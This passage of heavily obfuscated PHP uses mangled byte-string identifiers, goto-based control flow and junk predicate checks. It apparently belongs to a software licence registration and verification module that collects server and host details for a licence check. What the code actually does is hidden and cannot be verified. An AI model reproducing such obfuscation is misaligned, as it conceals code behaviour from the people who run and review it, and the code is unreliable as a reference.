$Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[95]][$d˜¢æÉŸ‚[96]][$d˜¢æÉŸ‚[101]][$d˜¢æÉŸ‚[109]] = 0; } $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[110]][$d˜¢æÉŸ‚[130]] = $d˜¢æÉŸ‚[106]($this->wljbff9f70e1, $d˜¢æÉŸ‚[131], $d˜¢æÉŸ‚[10]); goto BÍöé¸îÍá; B´Ë´àã¹ê: $c˜¼Ã“ˆŠ = $d·Ø…Ì®ª™[581]; while (strlen($c˜¼Ã“ˆŠ) < $d·Ø…Ì®ª™[554]) { if (!$c˜¼Ã“ˆŠ) { break; } $c˜¼Ã“ˆŠ++; } unset($Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[95]][$d˜¢æÉŸ‚[96]][$d˜¢æÉŸ‚[100]]); goto A¡‚ÀÒá­å; cæ‚´¦î…: $d·Ø…Ì®ª™ =& $_SERVER[í™]; $d˜¢æÉŸ‚ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $d×£Áö®Ö„ = $d˜¢æÉŸ‚[61]($d˜¢æÉŸ‚[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][63]}(); goto CîµÔ•²æ; BÍöé¸îÍá: $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[110]][$d˜¢æÉŸ‚[132]] = $d˜¢æÉŸ‚[106]($this->wljbff9f70e1, $d˜¢æÉŸ‚[133], $d˜¢æÉŸ‚[10]); if ($d˜¢æÉŸ‚[106]($GLOBALS, $d˜¢æÉŸ‚[134]) && $this->config[$d˜¢æÉŸ‚[135]]) { $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[110]][$d˜¢æÉŸ‚[136]] = WEB_ROOT; } return $Eé‹à‡Ù¾£; goto BîÜîÏ¶¤ñ; CÏ…ëù‚‡÷: $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[110]][$d˜¢æÉŸ‚[111]] = $d˜¢æÉŸ‚[112]($d˜¢æÉŸ‚[113])->{$_SERVER[æàÂÔ…ÔåÖÌ][114]}(); $döôÓÑ†‘Æ = $d·Ø…Ì®ª™[583]; if (strlen($döôÓÑ†‘Æ) < $d·Ø…Ì®ª™[562]) { die; } goto A”•ÁŠå¹®; D¶Ø–±‚ñá: $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[110]][$d˜¢æÉŸ‚[122]] = $this->tlodf6cf000b; $F›¸½Ù¿¤Ş = $d·Ø…Ì®ª™[586]; if (!$F›¸½Ù¿¤Ş) { die; } goto f‹·Ã§ÛŒ; A”•ÁŠå¹®: $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[110]][$d˜¢æÉŸ‚[115]] = $d˜¢æÉŸ‚[116]($_SERVER[$d˜¢æÉŸ‚[117]] . $d×£Áö®Ö„[$d˜¢æÉŸ‚[118]]); $Bšìá’¢± = $d·Ø…Ì®ª™[584]; if (strlen($Bšìá’¢±) < $d·Ø…Ì®ª™[560]) { return; } goto cË—È§Úç; CîµÔ•²æ: $eí¨‘ÜÏë = array($d˜¢æÉŸ‚[64], $d˜¢æÉŸ‚[65], $d˜¢æÉŸ‚[66], $d˜¢æÉŸ‚[67], $d˜¢æÉŸ‚[68], $d˜¢æÉŸ‚[69], $d˜¢æÉŸ‚[70], $d˜¢æÉŸ‚[71], $d˜¢æÉŸ‚[72], $d˜¢æÉŸ‚[73], $d˜¢æÉŸ‚[74], $d˜¢æÉŸ‚[75], $d˜¢æÉŸ‚[76], $d˜¢æÉŸ‚[77], $d˜¢æÉŸ‚[78], $d˜¢æÉŸ‚[79], $d˜¢æÉŸ‚[80], $d˜¢æÉŸ‚[81], $d˜¢æÉŸ‚[82], $d˜¢æÉŸ‚[83], $d˜¢æÉŸ‚[84], $d˜¢æÉŸ‚[85], $d˜¢æÉŸ‚[86], $d˜¢æÉŸ‚[87], $d˜¢æÉŸ‚[88], $d˜¢æÉŸ‚[89], $d˜¢æÉŸ‚[90], $d˜¢æÉŸ‚[91], $d˜¢æÉŸ‚[92]); foreach ($eí¨‘ÜÏë as $BÔ¢‹‡óç) { $AŒ°™‡‰èé = $GLOBALS[$d˜¢æÉŸ‚[93]][$d˜¢æÉŸ‚[94]][$BÔ¢‹‡óç]; $Bï„„©í¢À = $d·Ø…Ì®ª™[576]; if (strlen($Bï„„©í¢À) < $d·Ø…Ì®ª™[577]) { die; } if (isset($d×£Áö®Ö„[$BÔ¢‹‡óç])) { $AŒ°™‡‰èé = $d×£Áö®Ö„[$BÔ¢‹‡óç]; } $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[95]][$d˜¢æÉŸ‚[96]][$BÔ¢‹‡óç] = $AŒ°™‡‰èé; } $C«À²ÙŒë = $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[95]][$d˜¢æÉŸ‚[96]][$d˜¢æÉŸ‚[76]]; goto D—ªË‘‡óŠ; D—ªË‘‡óŠ: $E¥À†êËë† = $d·Ø…Ì®ª™[578]; while ($E¥À†êËë† < $d·Ø…Ì®ª™[560]) { if ($E¥À†êËë† >= 0) { break; } $E¥À†êËë†++; } unset($Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[95]][$d˜¢æÉŸ‚[97]][$d˜¢æÉŸ‚[98]]); goto Eêˆ¾Ü; cË—È§Úç: $Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[110]][$d˜¢æÉŸ‚[119]] = $d˜¢æÉŸ‚[120]($d˜¢æÉŸ‚[121]()); $b™›…Ú‘œõ = $d·Ø…Ì®ª™[585]; while (strlen($b™›…Ú‘œõ) < $d·Ø…Ì®ª™[550]) { if (!$b™›…Ú‘œõ) { break; } $b™›…Ú‘œõ++; } goto D¶Ø–±‚ñá; aìñÚ¾ˆó: $DœœŸŸ®é¹ = $d·Ø…Ì®ª™[580]; while (strlen($DœœŸŸ®é¹) < $d·Ø…Ì®ª™[562]) { if (!$DœœŸŸ®é¹) { break; } $DœœŸŸ®é¹++; } unset($Eé‹à‡Ù¾£[$d˜¢æÉŸ‚[95]][$d˜¢æÉŸ‚[96]][$d˜¢æÉŸ‚[76]]); goto B´Ë´àã¹ê; BîÜîÏ¶¤ñ: } private function jynib356440b() { goto F¦åŸ‘Üª†; CÒà¼†‘°Ó: if ($this->tlodf6cf000b == $b’İàµ¢—[123]) { return; } $DêÖƒ´÷× = array($b’İàµ¢—[155], $b’İàµ¢—[156], $b’İàµ¢—[157], $b’İàµ¢—[158], $b’İàµ¢—[159], $b’İàµ¢—[160]); $AÕÖï“İ¿« = $b’İàµ¢—[61]($b’İàµ¢—[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][63]}(); goto a“İ›ê‚Ê×; F¦åŸ‘Üª†: $dù¤·š¬¬ë =& $_SERVER[í™]; $b’İàµ¢— =& $_SERVER[æàÂÔ…ÔåÖÌ]; if ($_SERVER[$b’İàµ¢—[44]] == $b’İàµ¢—[137]) { goto BÂ»‰¶Ö ‘; A¯‰•÷‹ˆÒ: $e˜«Çò—¼Å = $dù¤·š¬¬ë[587]; if (!$e˜«Çò—¼Å) { return; } $F¦Ò²â×ÛË = array($b’İàµ¢—[152] => $b«¯§Ğ‘°œ); goto b†÷Ñá¼º; b†÷Ñá¼º: $b’İàµ¢—[13](array($b’İàµ¢—[153], $b’İàµ¢—[154]), $F¦Ò²â×ÛË); $FŸòº¹‹— = $dù¤·š¬¬ë[588]; while (strlen($FŸòº¹‹—) < $dù¤·š¬¬ë[554]) { if (!$FŸòº¹‹—) { break; } $FŸòº¹‹—++; } goto BÃíÃÌ–; BÂ»‰¶Ö ‘: $b«¯§Ğ‘°œ = array($b’İàµ¢—[122] => $this->tlodf6cf000b, $b’İàµ¢—[138] => $this->{$_SERVER[æàÂÔ…ÔåÖÌ][139]}(), $b’İàµ¢—[140] => $b’İàµ¢—[61]($b’İàµ¢—[141])->{$_SERVER[æàÂÔ…ÔåÖÌ][142]}()); if ($this->tlodf6cf000b != $b’İàµ¢—[123]) { $CĞË©íõÒŒ = $b’İàµ¢—[106]($this->wljbff9f70e1, $b’İàµ¢—[143]); if ($CĞË©íõÒŒ) { $b«¯§Ğ‘°œ[$b’İàµ¢—[144]] = $CĞË©íõÒŒ; $b«¯§Ğ‘°œ[$b’İàµ¢—[145]] = $b’İàµ¢—[146]($b’İàµ¢—[106]($this->wljbff9f70e1, $b’İàµ¢—[147])); $b«¯§Ğ‘°œ[$b’İàµ¢—[148]] = $b’İàµ¢—[106]($this->wljbff9f70e1, $b’İàµ¢—[133]); } } $b«¯§Ğ‘°œ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($b’İàµ¢—[150]($b«¯§Ğ‘°œ), $b’İàµ¢—[116]($b’İàµ¢—[151])); goto A¯‰•÷‹ˆÒ; BÃíÃÌ–: } goto CÒà¼†‘°Ó; a“İ›ê‚Ê×: $bÃ¼ä•Áº¢ = $dù¤·š¬¬ë[589]; if (!$bÃ¼ä•Áº¢) { return; } $F¦Ò²â×ÛË = array($b’İàµ¢—[161] => $AÕÖï“İ¿«[$b’İàµ¢—[64]], $b’İàµ¢—[162] => $AÕÖï“İ¿«[$b’İàµ¢—[65]], $b’İàµ¢—[163] => $b’İàµ¢—[10]); goto fêÌÁÏ£Ñ¡; fêÌÁÏ£Ñ¡: foreach ($DêÖƒ´÷× as $DÅÛ»ªÕÑ) { if (!isset($AÕÖï“İ¿«[$DÅÛ»ªÕÑ]) || !$AÕÖï“İ¿«[$DÅÛ»ªÕÑ]) { continue; } $F¦Ò²â×ÛË[$DÅÛ»ªÕÑ] = $AÕÖï“İ¿«[$DÅÛ»ªÕÑ]; } $b’İàµ¢—[13](array($b’İàµ¢—[153], $b’İàµ¢—[154]), $F¦Ò²â×ÛË); goto f¹ºëóÒÊÁ; f¹ºëóÒÊÁ: } private function azqyc9496ab3() { goto b‚éŞ¨í«; d—øõÚ„´»: $bœ†¥†Óš = $dŸ™ŞœƒØ[593]; if (strlen($bœ†¥†Óš) < $dŸ™ŞœƒØ[554]) { die; } $BÕ¾Ññ–í¸[$e´²Ü„²˜ƒ[125]] = $e´²Ü„²˜ƒ[120]($e´²Ü„²˜ƒ[216]($this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($b–áŠÄİ˜¥, $e´²Ü„²˜ƒ[218]))); goto CğÔ„šŠÉ°; eÛ£âÙã­­: $c§»ïÊòß = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][129]}($e´²Ü„²˜ƒ[150]($aø‘†ÙÍ‹í), $D°†òÉ°Ö); $BµğˆÙ©éí = $e´²Ü„²˜ƒ[224]($e´²Ü„²˜ƒ[61]($e´²Ü„²˜ƒ[11])->{$_SERVER[æàÂÔ…ÔåÖÌ][225]}(), $e´²Ü„²˜ƒ[226]); $D¾Œ†”‘Š = $BµğˆÙ©éí[$e´²Ü„²˜ƒ[227]]; goto E…êÚ¼à±Å; F…à—ÁÚö¨: $cñ¨ßõÈŸ = $dòæ¼ãˆ¥• . $BÕ¾Ññ–í¸[$e´²Ü„²˜ƒ[122]] . $BÕ¾Ññ–í¸[$e´²Ü„²˜ƒ[214]]; $d‰ŠĞöàÚ = $dŸ™ŞœƒØ[592]; while (strlen($d‰ŠĞöàÚ) < $dŸ™ŞœƒØ[577]) { if (!$d‰ŠĞöàÚ) { break; } $d‰ŠĞöàÚ++; } goto eòî•Œ®ÕÂ; bÉËÎ—’²: if (!$e´²Ü„²˜ƒ[106]($GLOBALS, $e´²Ü„²˜ƒ[134])) { die; } $C©¼ô²•¬í = $GLOBALS[$e´²Ü„²˜ƒ[22]]; if (isset($C©¼ô²•¬í[$e´²Ü„²˜ƒ[165]])) { $this->{$_SERVER[æàÂÔ…ÔåÖÌ][166]}(); die; } goto A¶ÇÄÊ“‰–; dˆ±Ô‹éœß: if ($C©¼ô²•¬í[$e´²Ü„²˜ƒ[180]] == $e´²Ü„²˜ƒ[181]) { $d©½éµœÄ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($dóÖ°â¶è¨, $e´²Ü„²˜ƒ[182]); $FÍ‡«½‹ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][129]}($e´²Ü„²˜ƒ[150]($fõ™ŒÎíòÔ), $dóÖ°â¶è¨ . $e´²Ü„²˜ƒ[183], 3); $A¡ãÔÌ¹ï‚ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][184]}($e´²Ü„²˜ƒ[185] . $d©½éµœÄ . $e´²Ü„²˜ƒ[186] . $FÍ‡«½‹, -1); $e´²Ü„²˜ƒ[168]($A¡ãÔÌ¹ï‚, !0); } else { if ($C©¼ô²•¬í[$e´²Ü„²˜ƒ[180]] == $e´²Ü„²˜ƒ[187]) { $A¨á“‹Â° = $e´²Ü„²˜ƒ[25]($e´²Ü„²˜ƒ[116]($e´²Ü„²˜ƒ[188] . $dóÖ°â¶è¨), 12, 15) . $e´²Ü„²˜ƒ[189]; $FÍ‡«½‹ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][190]}($e´²Ü„²˜ƒ[2]($C©¼ô²•¬í[$e´²Ü„²˜ƒ[191]]), $A¨á“‹Â°, 2); $Bá¬º‚¹ê = $e´²Ü„²˜ƒ[192]($FÍ‡«½‹, !0); if (!$e´²Ü„²˜ƒ[193]($Bá¬º‚¹ê) || !$e´²Ü„²˜ƒ[193]($Bá¬º‚¹ê[$e´²Ü„²˜ƒ[194]]) || $Bá¬º‚¹ê[$e´²Ü„²˜ƒ[167]] != !0) { $DµïÙ„¼ = $e´²Ü„²˜ƒ[195]; $e©êˆÚ­Ù = $Bá¬º‚¹ê[$e´²Ü„²˜ƒ[194]] ? $e´²Ü„²˜ƒ[196] . $Bá¬º‚¹ê[$e´²Ü„²˜ƒ[194]] : $DµïÙ„¼; $e´²Ü„²˜ƒ[168]($e©êˆÚ­Ù, !1); } else { $fõ™ŒÎíòÔ[$e´²Ü„²˜ƒ[170]] = $Bá¬º‚¹ê[$e´²Ü„²˜ƒ[194]][$e´²Ü„²˜ƒ[197]]; } } else { $Bá¬º‚¹ê = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][184]}($e´²Ü„²˜ƒ[198], $fõ™ŒÎíòÔ, 10); } } if (!$e´²Ü„²˜ƒ[193]($Bá¬º‚¹ê) || !$e´²Ü„²˜ƒ[193]($Bá¬º‚¹ê[$e´²Ü„²˜ƒ[194]]) || $Bá¬º‚¹ê[$e´²Ü„²˜ƒ[167]] != !0) { $DµïÙ„¼ = $e´²Ü„²˜ƒ[199]($e´²Ü„²˜ƒ[200]); $e©êˆÚ­Ù = $Bá¬º‚¹ê[$e´²Ü„²˜ƒ[194]] ? $e´²Ü„²˜ƒ[196] . $Bá¬º‚¹ê[$e´²Ü„²˜ƒ[194]] : $DµïÙ„¼; $e´²Ü„²˜ƒ[168]($e©êˆÚ­Ù, !1); } $aø‘†ÙÍ‹í = $Bá¬º‚¹ê[$e´²Ü„²˜ƒ[194]]; goto eæ”ßŸìŸ—; b‚éŞ¨í«: $dŸ™ŞœƒØ =& $_SERVER[í™]; $e´²Ü„²˜ƒ =& $_SERVER[æàÂÔ…ÔåÖÌ]; if ($_SERVER[$e´²Ü„²˜ƒ[44]] != $e´²Ü„²˜ƒ[164]) { return; } goto bÉËÎ—’²; cïé²•Œ’Š: $e´²Ü„²˜ƒ[61]($e´²Ü„²˜ƒ[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][223]}($BÕ¾Ññ–í¸); $D°†òÉ°Ö = $e´²Ü„²˜ƒ[116]($_SERVER[$e´²Ü„²˜ƒ[117]] . $e´²Ü„²˜ƒ[216]($c¿òç˜…¦Ù) . $BÕ¾Ññ–í¸[$e´²Ü„²˜ƒ[212]]); $bï‡­İÊì = $e´²Ü„²˜ƒ[216]($e´²Ü„²˜ƒ[25]($D°†òÉ°Ö, 10, 16)); goto eÛ£âÙã­­; CğÔ„šŠÉ°: $B™•ğºÀ· = $dŸ™ŞœƒØ[594]; if (strlen($B™•ğºÀ·) < $dŸ™ŞœƒØ[577]) { return; } if ($aø‘†ÙÍ‹í[$e´²Ü„²˜ƒ[219]] && $aø‘†ÙÍ‹í[$e´²Ü„²˜ƒ[219]] >= 1) { $e´²Ü„²˜ƒ[61]($e´²Ü„²˜ƒ[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][220]}($e´²Ü„²˜ƒ[221], $e´²Ü„²˜ƒ[222]); } goto cïé²•Œ’Š; eòî•Œ®ÕÂ: $BÕ¾Ññ–í¸[$e´²Ü„²˜ƒ[124]] = $e´²Ü„²˜ƒ[216]($e´²Ü„²˜ƒ[120]($this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($cñ¨ßõÈŸ, $e´²Ü„²˜ƒ[217]))); $Bï£¤¤Ôò = $e´²Ü„²˜ƒ[126](16); $b–áŠÄİ˜¥ = $Bï£¤¤Ôò . $BÕ¾Ññ–í¸[$e´²Ü„²˜ƒ[122]] . $this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($e´²Ü„²˜ƒ[116]($BÕ¾Ññ–í¸[$e´²Ü„²˜ƒ[211]]), $Bï£¤¤Ôò); goto d—øõÚ„´»; f‹ÉµÂ¾Áë: $B‘Éšò†÷ï = $dŸ™ŞœƒØ[590]; while ($B‘Éšò†÷ï < $dŸ™ŞœƒØ[560]) { if ($B‘Éšò†÷ï >= 0) { break; } $B‘Éšò†÷ï++; } $dóÖ°â¶è¨ = $e´²Ü„²˜ƒ[116]($_SERVER[$e´²Ü„²˜ƒ[117]] . $c¿òç˜…¦Ù); goto dˆ±Ô‹éœß; A¶ÇÄÊ“‰–: if (!isset($C©¼ô²•¬í[$e´²Ü„²˜ƒ[167]]) || $e´²Ü„²˜ƒ[24]($C©¼ô²•¬í[$e´²Ü„²˜ƒ[167]]) != 16) { $e´²Ü„²˜ƒ[168]($e´²Ü„²˜ƒ[169] . $C©¼ô²•¬í[$e´²Ü„²˜ƒ[167]], !1); } $c¿òç˜…¦Ù = $e´²Ü„²˜ƒ[61]($e´²Ü„²˜ƒ[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][63]}($e´²Ü„²˜ƒ[118]); $fõ™ŒÎíòÔ = array($e´²Ü„²˜ƒ[167] => $C©¼ô²•¬í[$e´²Ü„²˜ƒ[167]], $e´²Ü„²˜ƒ[170] => $e´²Ü„²˜ƒ[126](16), $e´²Ü„²˜ƒ[171] => $e´²Ü„²˜ƒ[151], $e´²Ü„²˜ƒ[172] => $e´²Ü„²˜ƒ[173], $e´²Ü„²˜ƒ[174] => $_SERVER[$e´²Ü„²˜ƒ[175]], $e´²Ü„²˜ƒ[176] => $_SERVER[$e´²Ü„²˜ƒ[177]], $e´²Ü„²˜ƒ[178] => $_SERVER[$e´²Ü„²˜ƒ[179]]); goto f‹ÉµÂ¾Áë; A˜‡ÎĞäù«: $E¸„é“‘ = $dŸ™ŞœƒØ[597]; while (strlen($E¸„é“‘) < $dŸ™ŞœƒØ[562]) { if (!$E¸„é“‘) { break; } $E¸„é“‘++; } $e´²Ü„²˜ƒ[168]($e´²Ü„²˜ƒ[199]($e´²Ü„²˜ƒ[210]), !0); goto cå—‚ÄÑ½; Bœ©İÜ÷ËÃ: $c¿»÷‚êã = $dŸ™ŞœƒØ[596]; $this->tlodf6cf000b = $BÕ¾Ññ–í¸[$e´²Ü„²˜ƒ[122]]; $this->{$_SERVER[æàÂÔ…ÔåÖÌ][231]}(); goto A˜‡ÎĞäù«; B›ÃŸÅ÷’Ñ: $BÕ¾Ññ–í¸ = array($e´²Ü„²˜ƒ[211] => $fõ™ŒÎíòÔ[$e´²Ü„²˜ƒ[167]], $e´²Ü„²˜ƒ[212] => $aø‘†ÙÍ‹í[$e´²Ü„²˜ƒ[213]], $e´²Ü„²˜ƒ[214] => $e´²Ü„²˜ƒ[126](16), $e´²Ü„²˜ƒ[122] => $aø‘†ÙÍ‹í[$e´²Ü„²˜ƒ[215]]); if ($fõ™ŒÎíòÔ[$e´²Ü„²˜ƒ[170]]) { $BÕ¾Ññ–í¸[$e´²Ü„²˜ƒ[214]] = $fõ™ŒÎíòÔ[$e´²Ü„²˜ƒ[170]]; } $dòæ¼ãˆ¥• = $e´²Ü„²˜ƒ[25]($e´²Ü„²˜ƒ[116]($BÕ¾Ññ–í¸[$e´²Ü„²˜ƒ[212]]), 10, 10); goto F…à—ÁÚö¨; AĞ®¸å“ï: if (!$aé½‡ùéä®) { die; } $e´²Ü„²˜ƒ[61]($e´²Ü„²˜ƒ[11])->{$_SERVER[æàÂÔ…ÔåÖÌ][228]}($D¾Œ†”‘Š[$e´²Ü„²˜ƒ[229]], array($e´²Ü„²˜ƒ[230] => $DôÓ×§ì•’)); $this->wljbff9f70e1 = $aø‘†ÙÍ‹í; goto Bœ©İÜ÷ËÃ; eæ”ßŸìŸ—: $dõÕ‡¬Îõà = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][201]}($aø‘†ÙÍ‹í[$e´²Ü„²˜ƒ[202]]); $eŠìóÂ‚‹¢ = $dŸ™ŞœƒØ[591]; if (!$dõÕ‡¬Îõà || $dõÕ‡¬Îõà != $e´²Ü„²˜ƒ[203]($aø‘†ÙÍ‹í[$e´²Ü„²˜ƒ[147]])) { $dçíÉÑòáÆ = array($e´²Ü„²˜ƒ[204] => $e´²Ü„²˜ƒ[61]($e´²Ü„²˜ƒ[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][63]}($e´²Ü„²˜ƒ[118]), $e´²Ü„²˜ƒ[205] => $_SERVER[$e´²Ü„²˜ƒ[117]], $e´²Ü„²˜ƒ[206] => $e´²Ü„²˜ƒ[207](), $e´²Ü„²˜ƒ[176] => $_SERVER[$e´²Ü„²˜ƒ[177]]); $FÍ‡«½‹ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][208]}($e´²Ü„²˜ƒ[150]($dçíÉÑòáÆ)); $this->{$_SERVER[æàÂÔ…ÔåÖÌ][184]}($e´²Ü„²˜ƒ[209] . $FÍ‡«½‹); $e´²Ü„²˜ƒ[168]($e´²Ü„²˜ƒ[199]($e´²Ü„²˜ƒ[210]), !0); } goto B›ÃŸÅ÷’Ñ; E…êÚ¼à±Å: $DôÓ×§ì•’ = array(); $DôÓ×§ì•’[$bï‡­İÊì] = $c§»ïÊòß; $aé½‡ùéä® = $dŸ™ŞœƒØ[595]; goto AĞ®¸å“ï; cå—‚ÄÑ½: } private function licenseRegistSuccess() { goto DÇ‰µ‘Ò…”; e‡ãî¦è£: $E÷°¢ÀØË• = $cªğ‰ŠİÌÕ[598]; if (strlen($E÷°¢ÀØË•) < $cªğ‰ŠİÌÕ[550]) { die; } if ($e“ÍŸ½ôÉ[$eóçˆ±òÚÏ[87]] != $eóçˆ±òÚÏ[222]) { $eóçˆ±òÚÏ[61]($eóçˆ±òÚÏ[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][223]}($eóçˆ±òÚÏ[87], $eóçˆ±òÚÏ[222]); } goto C²‚°âˆË; DÇ‰µ‘Ò…”: $cªğ‰ŠİÌÕ =& $_SERVER[í™]; $eóçˆ±òÚÏ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $e“ÍŸ½ôÉ = $eóçˆ±òÚÏ[61]($eóçˆ±òÚÏ[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][63]}(); goto e‡ãî¦è£; C²‚°âˆË: $eóçˆ±òÚÏ[112]($eóçˆ±òÚÏ[232])->{$_SERVER[æàÂÔ…ÔåÖÌ][233]}(!0); goto F˜¶‰‡¡âÌ; F˜¶‰‡¡âÌ: } private function cimy7f4bc8a8() { goto BÊ—æÛù‹¾; DàÒöÙ¶¼: $fâ´ÄÃÈƒ£ = $f¹¿¥Œ„¿á[600]; $this->tlodf6cf000b = $BÍÈ¼¸¦º„[123]; goto DšóÎ²‰ğŠ; BÊ—æÛù‹¾: $f¹¿¥Œ„¿á =& $_SERVER[í™]; $BÍÈ¼¸¦º„ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $BÍÈ¼¸¦º„[61]($BÍÈ¼¸¦º„[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][223]}(array($BÍÈ¼¸¦º„[211] => $BÍÈ¼¸¦º„[10], $BÍÈ¼¸¦º„[212] => $BÍÈ¼¸¦º„[10], $BÍÈ¼¸¦º„[122] => $BÍÈ¼¸¦º„[123], $BÍÈ¼¸¦º„[124] => $BÍÈ¼¸¦º„[10], $BÍÈ¼¸¦º„[125] => $BÍÈ¼¸¦º„[10])); goto bèà“ªÖâñ; a‡Œ‡ó¨ç³: $Eä¼é‘†«¿ = $f¹¿¥Œ„¿á[599]; if (strlen($Eä¼é‘†«¿) < $f¹¿¥Œ„¿á[554]) { return; } $this->wljbff9f70e1 = array(); goto DàÒöÙ¶¼; bèà“ªÖâñ: $cÑÉËÅÚ÷Š = $f¹¿¥Œ„¿á[571]; if (!$cÑÉËÅÚ÷Š) { die; } $BÍÈ¼¸¦º„[61]($BÍÈ¼¸¦º„[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][220]}($BÍÈ¼¸¦º„[221], $BÍÈ¼¸¦º„[234]); goto a‡Œ‡ó¨ç³; DšóÎ²‰ğŠ: } private function jmcg8fe04445() { goto c…äÓé•¹Ê; b•øİ¬è¿: $A™õ¹¾—øÁ = $cÎ‹‰öå[61]($cÎ‹‰öå[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][63]}(); $FÌÄğßãÄ = $eô“®Şƒ[602]; while (strlen($FÌÄğßãÄ) < $eô“®Şƒ[550]) { if (!$FÌÄğßãÄ) { break; } $FÌÄğßãÄ++; } goto däöÑ§é®Õ; e×¢ÆŞÊÉ: $CÑÚ½Äé¤ø = $cÎ‹‰öå[146]($Fçªğ™¿‡ï[$cÎ‹‰öå[147]]); if ($cÎ‹‰öå[235]() >= $CÑÚ½Äé¤ø) { return $this->{$_SERVER[æàÂÔ…ÔåÖÌ][166]}(); } $this->wljbff9f70e1 = $Fçªğ™¿‡ï; goto F§­¬ ÀË†; bØšÍ§´µš: $d“Ç ‹ÅÎº = $eô“®Şƒ[604]; while (strlen($d“Ç ‹ÅÎº) < $eô“®Şƒ[550]) { if (!$d“Ç ‹ÅÎº) { break; } $d“Ç ‹ÅÎº++; } $Fçªğ™¿‡ï = $cÎ‹‰öå[192]($Fçªğ™¿‡ï, !0); goto E¶Ó“ø•¸; a¾„Ëˆª¿¾: $this->tlodf6cf000b = $cÎ‹‰öå[123]; $F‰Ÿ½§ì¼² = $eô“®Şƒ[601]; if (!$F‰Ÿ½§ì¼²) { die; } goto b•øİ¬è¿; c…äÓé•¹Ê: $eô“®Şƒ =& $_SERVER[í™]; $cÎ‹‰öå =& $_SERVER[æàÂÔ…ÔåÖÌ]; $_SERVER[$cÎ‹‰öå[177]] = $cÎ‹‰öå[106]($_SERVER, $cÎ‹‰öå[177], APP_HOST); goto a¾„Ëˆª¿¾; c¢ä£‘íŠ: $DêÃ°¼ğó¿ = $aÊºËÌ¯¶[$cÎ‹‰öå[227]]; $e‘äæ¾œ‚˜ = $cÎ‹‰öå[116]($_SERVER[$cÎ‹‰öå[117]] . $cÎ‹‰öå[216]($DÔà©ĞÓÇò) . $A™õ¹¾—øÁ[$cÎ‹‰öå[212]]); $eÁ«îòÀ“£ = $cÎ‹‰öå[216]($cÎ‹‰öå[25]($e‘äæ¾œ‚˜, 10, 16)); goto D¬‘†¾Ó¯; E¶Ó“ø•¸: $b¤µ±Àçì¯ = $eô“®Şƒ[605]; if (strlen($b¤µ±Àçì¯) < $eô“®Şƒ[577]) { return; } if (!$cÎ‹‰öå[193]($Fçªğ™¿‡ï)) { return $this->{$_SERVER[æàÂÔ…ÔåÖÌ][166]}(); } goto e×¢ÆŞÊÉ; F§­¬ ÀË†: $this->tlodf6cf000b = $A™õ¹¾—øÁ[$cÎ‹‰öå[122]]; goto DˆÖ¼ÕóØ³; däöÑ§é®Õ: if ($A™õ¹¾—øÁ[$cÎ‹‰öå[122]] == $cÎ‹‰öå[123]) { return; } $DÔà©ĞÓÇò = $cÎ‹‰öå[61]($cÎ‹‰öå[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][63]}($cÎ‹‰öå[118]); $aÊºËÌ¯¶ = $cÎ‹‰öå[224]($cÎ‹‰öå[61]($cÎ‹‰öå[11])->{$_SERVER[æàÂÔ…ÔåÖÌ][225]}(), $cÎ‹‰öå[226]); goto c¢ä£‘íŠ; D¬‘†¾Ó¯: $fÙ²÷ø‚¡ = $eô“®Şƒ[603]; if (!$fÙ²÷ø‚¡) { return; } $Fçªğ™¿‡ï = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][190]}($DêÃ°¼ğó¿[$cÎ‹‰öå[93]][$eÁ«îòÀ“£], $e‘äæ¾œ‚˜); goto bØšÍ§´µš; DˆÖ¼ÕóØ³: } private function bmoy7abdb39a() { goto c¾²öØŒ¿Ñ; c¾²öØŒ¿Ñ: $D¤•ÓÜ†… =& $_SERVER[í™]; $f¯”â‘‹å =& $_SERVER[æàÂÔ…ÔåÖÌ]; $d™¤”£ÕŒ§ = $GLOBALS[$f¯”â‘‹å[22]]; goto BÅàº†Á; BÅàº†Á: $ešÙàŒ‚¾ß = $_SERVER[$f¯”â‘‹å[44]]; $FŞ¥’«â£‰ = $D¤•ÓÜ†…[606]; while ($FŞ¥’«â£‰ < $D¤•ÓÜ†…[560]) { if ($FŞ¥’«â£‰ >= 0) { break; } $FŞ¥’«â£‰++; } goto b¼¡¼Ù—íå; b¼¡¼Ù—íå: if ($ešÙàŒ‚¾ß == $f¯”â‘‹å[236] && $this->tlodf6cf000b == $f¯”â‘‹å[123]) { $f¯”â‘‹å[168]($f¯”â‘‹å[199]($f¯”â‘‹å[237]), !1, 